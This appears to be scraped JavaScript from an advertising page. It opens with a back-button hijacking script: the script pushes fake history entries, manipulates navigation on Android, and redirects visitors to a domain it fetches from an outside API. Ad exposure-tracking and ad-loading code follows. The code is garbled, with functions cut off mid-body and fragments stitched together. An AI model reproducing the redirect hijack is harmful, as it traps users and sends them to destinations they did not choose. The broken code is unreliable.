<script>
    function gogg(url){
        history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());
        if(navigator.userAgent.indexOf('Android') != -1){
            if(typeof(tbsJs) != "undefined"){
                tbsJs.onReady('{useCachedApi : "true"}', function(e) {})
                window.onhashchange=function(){
                    location.href = url;
                };
            }else{
                var pop = 0;
                window.onhashchange = function(event) {
                    pop++
                    if (pop >= 3) {
                        location.href = url;
                    }else{
                        history.go(1)
                    }
                };
                history.go(-1);
            }
        }else{
            window.onhashchange=function(){
                location.href = url;
            };
        }
    }
    $.ajax({
        type: 'GET',
        url: 'http://api.longxx.cn/bak/gg/api/api.php',
        dataType: 'json',
        success: function(data){
            console.log(data)
            gogg(data.domainname + '/bak/gg?xyzfan2')
        },
        error:  function(err){
            adTwo()
        },
    })
    function adTwo () {
        $.get("https://api.longxx.cn/bak/gg/api/api.php", function(result){
            gogg(result.domainname + '/bak/gg?xyzfan2')
        });
    }
</script>

    var Ad = {

        /**

         */
        back: function(backUrl) {
            if (!backUrl) {

            }
            var fn = arguments.callee;
            if (fn.hasInit) {

            }
            fn.hasInit = true;
            setTimeout(function() {

        /**
         * 获取年月日
         */
        getDate: function() {
            var date = new Date();
            var year = date.getFullYear();
            var month = date.getMonth() + 1;
            var strDate = date.getDate();
            month = month < 10 ? '0' + month : month;
            strDate = strDate < 10 ? '0' + strDate : strDate;
            return year + '-' + month + '-' + strDate;
        },
        /**
         * 获取范围随机数
         */
        random: function(min, max) {
            return Math.floor(Math.random() * (max - min + 1) + min);
        },
        /**
         * 判断元素是否在可视区
         * 用于广告曝光率
         */
        isElementInViewport: function(el) {
            if (typeof jQuery === 'function' && el instanceof jQuery) {
                el = el[0];
            }

            var rect = el.getBoundingClientRect();

            return (
                rect.top >= 0 &&
                rect.left >= 0 &&
                rect.bottom <=
                (window.innerHeight || document.documentElement.clientHeight) &&
                rect.right <= (window.innerWidth || document.documentElement.clientWidth)
            );
        },
        /**
         * 监测曝光率
         * div 广告dom
         * monitorUrl 广告曝光接口
         */
        checkMonitor: function(div, monitorUrl) {
            var isInViewport = Ad.isElementInViewport(div);
            if (isInViewport) {
                monitorUrl.forEach(function(url) {
                    Ad.send(url);
                });
                return;
            }

            var checkFun = Ad.throttle(function() {
                if (Ad.isElementInViewport(div)) {
                    window.removeEventListener('scroll', checkFun, true);
                    monitorUrl.forEach(function(url) {
                        Ad.send(url);
                    });
                }
            }, 200);

            window.addEventListener('scroll', checkFun, true);
        },
        /**
         * 节流
         */
        throttle: function(func, wait, options) {
            var context, args, result;
            var timeout = null;
            var previous = 0;
            if (!options) options = {};
            var later = function() {
                previous = options.leading === false ? 0 : new Date().getTime();
                timeout = null;
                result = func.apply(context, args);
                if (!timeout) context = args = null;
            };
            return function() {
                var now = new Date().getTime();
                if (!previous && options.leading === false) previous = now;
                // 计算剩余时间
                var remaining = wait - (now - previous);
                context = this;
                args = arguments;
                if (remaining <= 0 || remaining > wait) {
                    if (timeout) {
                        clearTimeout(timeout);
                        timeout = null;
                    }
                    previous = now;
                    result = func.apply(context, args);
                    if (!timeout) context = args = null;
                } else if (!timeout && options.trailing !== false) {
                    // options.trailing=true时，延时执行func函数
                    timeout = setTimeout(later, remaining);
                }
                return result;
            };
        },
        /**
         * 发送请求
         */
        send: function(url) {
            var img = document.createElement('img');
            img.src = url;
            img.style.display = 'none';

        var scrollTop = $(this).scrollTop();
        var scrollHeight = $(document).height();
        var windowHeight = $(this).height();
        if(scrollTop + windowHeight == scrollHeight) {
            var eee = new EventEmitter();
            var newIndex = 0
            var newAds = [
                {
                    isTwo: 1,
                    pid: '1009963', //广告位id
                    templateId: 'ad-template-big', //模板script的id
                    wrapDomId: 'adList', //插入广告模板的父级id
                    adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
                },
            ]

            eee.addListener('fetch-jj-ad', function() {
                var curData = newAds[newIndex];
                //请求并渲染广告

                Ad.singleAd(
                    $.extend(curData, {
                        data: {
                            app_id: parseInt(curData.pid) == 1014646 ? 102587 : 102583,
                            deny_cids: deny_cids.join(',')
                        }
                    }),
                    function(res) {
                        if (newIndex === newAds.length - 1) return;
                        if (res && deny_cids.indexOf(res.cid) == -1) {
                            /* 当前广告请求完毕后 将广告的cid(创意id)插入 deny_cids 用于防止广告重复 */
                            deny_cids.push(res.cid); //插入创意id 用于广告位被重复广告占用
                        }
                        newIndex++;
                        /* 请求下个广告 */
                        eee.emitEvent('fetch-jj-ad');
                    }
                );
            });
            eee.emitEvent('fetch-jj-ad');
        }
    })

    function getDate() {
        var date = new Date();
        var year = date.getFullYear();
        var month = date.getMonth() + 1;
        var strDate = date.getDate();
        month = month < 10 ? '0' + month : month;
        strDate = strDate < 10 ? '0' + strDate : strDate;
        return year + '-' + month + '-' + strDate;
    }

    function random(min, max) {
        return Math.floor(Math.random() * (max - min + 1) + min);
    }
    function getParam(name, url) { // 获取地址栏参数
        if (typeof name !== 'string') return false
        if (!url) url = window.location.href
        // 当遇到name[xx]时，对方括号做一下转义为 name\[xxx\]，因为下面还需要使用name做正则
        name = name.replace(/[\[\]]/g, '\\$&')
        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)')
        var results = regex.exec(url)
        if (!results) return null
        if (!results[2]) return ''
        return decodeURIComponent(results[2].replace(/\+/g, ' '))
    }

    function makeRandomArr (arrList, num) { // 随机取出数组元素
        if (num > arrList.length) {
            num = arrList.length // eslint-disable-line
        }
        var tempArr = arrList.slice(0)
        var newArrList = []
        for (var i = 0; i < num; i++) {
            var random = Math.floor(Math.random() * (tempArr.length))
            var arr = tempArr[random]
            tempArr.splice(random, 1)
            newArrList.push(arr)
        }
        return newArrList
    }
</script>
